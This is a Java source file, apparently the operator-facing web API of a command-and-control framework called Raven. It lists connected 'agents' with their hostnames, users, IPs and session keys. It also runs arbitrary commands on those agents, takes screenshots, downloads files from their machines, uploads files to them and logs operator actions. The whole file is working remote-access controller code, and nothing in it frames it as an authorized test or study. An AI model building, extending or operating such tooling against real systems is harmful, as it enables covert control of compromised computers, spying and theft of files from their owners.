package com.raven.interfaces.APP.api;

import com.raven.core.database.TeamDatabase;
import com.raven.core.session.Session;
import com.raven.interfaces.APP.core.WebLogger;
import com.raven.interfaces.APP.core.WebServerManager;
import com.raven.interfaces.APP.shared.HttpHelper;
import com.sun.net.httpserver.HttpExchange;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public final class AgentApi {

    private final WebServerManager ServerManager;
    private final TeamDatabase Database;
    private final WebLogger Logger;

    public AgentApi(WebServerManager ServerManager, TeamDatabase Database, WebLogger Logger) {
        this.ServerManager = ServerManager;
        this.Database = Database;
        this.Logger = Logger;
    }

    public String List(HttpExchange Exchange) {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Agents", java.util.Collections.emptyList()));
        List<Map<String, Object>> Agents = new ArrayList<>();
        for (Session ActiveSession : ServerManager.GetServer().GetSessions().GetAll()) {
            Map<String, Object> Agent = new LinkedHashMap<>();
            Agent.put("ID", ActiveSession.GetId());
            Agent.put("Hostname", ActiveSession.GetHostname());
            Agent.put("OS", ActiveSession.GetOs());
            Agent.put("User", ActiveSession.GetUser());
            Agent.put("Arch", ActiveSession.GetArch());
            Agent.put("AgentIP", ActiveSession.GetAgentIp());
            Agent.put("AgentName", ActiveSession.GetAgentName());
            Agent.put("DisplayName", ActiveSession.GetDisplayName());
            Agent.put("SessionKey", ActiveSession.GetSessionKey());
            Agent.put("JoinedAt", ActiveSession.GetJoinedAt());
            Agent.put("Type", ActiveSession.GetSessionType().name());
            Agent.put("ShellMode", ActiveSession.GetShellMode());
            Agent.put("Encrypted", ActiveSession.IsEncrypted());
            Agent.put("MtlsEnabled", ActiveSession.IsMtlsEnabled());
            Agent.put("Note", Database.GetAgentNote(ActiveSession.GetId()));
            Agents.add(Agent);
        }
        return HttpHelper.Json(Map.of("Agents", Agents));
    }

    public String Kill(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        int AgentId = HttpHelper.Num(HttpHelper.Body(Exchange), "AgentId", 0);
        if (AgentId == 0) return HttpHelper.Json(Map.of("Error", "AgentId required"));
        ServerManager.GetServer().RemoveSession(AgentId);
        Logger.Add("[KILL] Agent-" + AgentId);
        return HttpHelper.Json(Map.of("Success", true));
    }

    public String Execute(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        int AgentId = HttpHelper.Num(Body, "AgentId", 0);
        String Command = HttpHelper.Str(Body, "Command", "");
        String Operator = HttpHelper.Str(Body, "Operator", "system");
        if (AgentId == 0 || Command.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Command required"));
        Logger.Add("[>] [" + Operator + "] Agent-" + AgentId + " >> " + Command);
        String[] Result = ServerManager.GetServer().ExecuteCommand(AgentId, Command);
        boolean Success = Boolean.parseBoolean(Result[0]);
        Database.SaveCommandLog(AgentId, Operator, Command, Result[1], Success);
        return HttpHelper.Json(Map.of("Success", Success, "Output", Result[1], "Command", Command));
    }

    public String Screenshot(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        int AgentId = HttpHelper.Num(Body, "AgentId", 0);
        String Operator = HttpHelper.Str(Body, "Operator", "system");
        if (AgentId == 0) return HttpHelper.Json(Map.of("Error", "AgentId required"));
        String[] Result = ServerManager.GetServer().ExecuteCommand(AgentId, "screenshot");
        boolean Success = Boolean.parseBoolean(Result[0]);
        Database.SaveCommandLog(AgentId, Operator, "screenshot", Result[1], Success);
        Logger.Add("[SCREENSHOT] Agent-" + AgentId + " >> " + (Success ? "saved" : Result[1]));
        return HttpHelper.Json(Map.of("Success", Success, "Output", Result[1]));
    }

    public String Download(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        int AgentId = HttpHelper.Num(Body, "AgentId", 0);
        String Path = HttpHelper.Str(Body, "Path", "");
        String Operator = HttpHelper.Str(Body, "Operator", "system");
        if (AgentId == 0 || Path.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and Path required"));
        String[] Result = ServerManager.GetServer().ExecuteCommand(AgentId, "download " + Path);
        boolean Success = Boolean.parseBoolean(Result[0]);
        Database.SaveCommandLog(AgentId, Operator, "download " + Path, Result[1], Success);
        Logger.Add("[DOWNLOAD] Agent-" + AgentId + " << " + Path + (Success ? " OK" : " FAILED"));
        return HttpHelper.Json(Map.of("Success", Success, "Output", Result[1], "Path", Path));
    }

    public String Upload(HttpExchange Exchange) throws Exception {
        if (!ServerManager.IsRunning()) return HttpHelper.Json(Map.of("Error", "Server not running"));
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        int AgentId = HttpHelper.Num(Body, "AgentId", 0);
        String LocalPath = HttpHelper.Str(Body, "LocalPath", "");
        String RemotePath = HttpHelper.Str(Body, "RemotePath", "");
        String Operator = HttpHelper.Str(Body, "Operator", "system");
        if (AgentId == 0 || LocalPath.isEmpty()) return HttpHelper.Json(Map.of("Error", "AgentId and LocalPath required"));
        String Command = RemotePath.isEmpty() ? "upload " + LocalPath : "upload " + LocalPath + " " + RemotePath;
        String[] Result = ServerManager.GetServer().ExecuteCommand(AgentId, Command);
        boolean Success = Boolean.parseBoolean(Result[0]);
        Database.SaveCommandLog(AgentId, Operator, Command, Result[1], Success);
        Logger.Add("[UPLOAD] Agent-" + AgentId + " >> " + LocalPath + (Success ? " OK" : " FAILED"));
        return HttpHelper.Json(Map.of("Success", Success, "Output", Result[1]));
    }

    public String SetNote(HttpExchange Exchange) throws Exception {
        Map<String, Object> Body = HttpHelper.Body(Exchange);
        Database.SetAgentNote(HttpHelper.Num(Body, "AgentId", 0), HttpHelper.Str(Body, "Note", ""));
        return HttpHelper.Json(Map.of("Success", true));
    }
}
